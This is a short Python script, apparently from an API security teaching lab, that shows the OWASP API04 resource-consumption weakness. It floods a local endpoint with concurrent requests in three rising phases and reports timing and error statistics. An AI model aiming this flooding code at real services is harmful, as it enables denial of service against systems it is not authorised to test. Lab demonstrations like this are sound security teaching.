#!/usr/bin/env python3
"""
API04 Unrestricted Resource Consumption - Request Flooding Attack
Educational demonstration of how lack of rate limiting allows API flooding.
"""

import requests
import concurrent.futures
import time

API_URL = "http://localhost:5004"

def send_request(i):
    """Send a single request"""
    try:
        start = time.time()
        response = requests.get(f"{API_URL}/api/users")
        duration = time.time() - start
        
        return {
            'request_num': i,
            'status': response.status_code,
            'duration': duration,
            'size': len(response.content)
        }
    except Exception as e:
        return {'request_num': i, 'error': str(e)}

def flood_test(concurrent_requests=10, total_requests=100):
    """Flood the API with requests"""
    print(f"Flooding API with {total_requests} requests ({concurrent_requests} concurrent)...")
    
    start_time = time.time()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrent_requests) as executor:
        futures = [executor.submit(send_request, i) for i in range(total_requests)]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]
    
    duration = time.time() - start_time
    
    # Analyze results
    successful = [r for r in results if 'error' not in r]
    errors = [r for r in results if 'error' in r]
    
    print(f"\nResults:")
    print(f"  Total time: {duration:.2f}s")
    print(f"  Successful: {len(successful)}")
    print(f"  Errors: {len(errors)}")
    print(f"  Requests/sec: {total_requests/duration:.2f}")
    
    if successful:
        avg_duration = sum(r['duration'] for r in successful) / len(successful)
        avg_size = sum(r['size'] for r in successful) / len(successful)
        print(f"  Avg response time: {avg_duration:.2f}s")
        print(f"  Avg response size: {avg_size/1024:.2f} KB")

if __name__ == '__main__':
    # Start with low volume
    print("Phase 1: Low volume (10 concurrent)")
    flood_test(concurrent_requests=10, total_requests=50)
    
    print("\n" + "="*60 + "\n")
    
    # Increase to medium volume
    print("Phase 2: Medium volume (50 concurrent)")
    flood_test(concurrent_requests=50, total_requests=200)
    
    print("\n" + "="*60 + "\n")
    
    # High volume attack
    print("Phase 3: High volume (100 concurrent)")
    flood_test(concurrent_requests=100, total_requests=500)
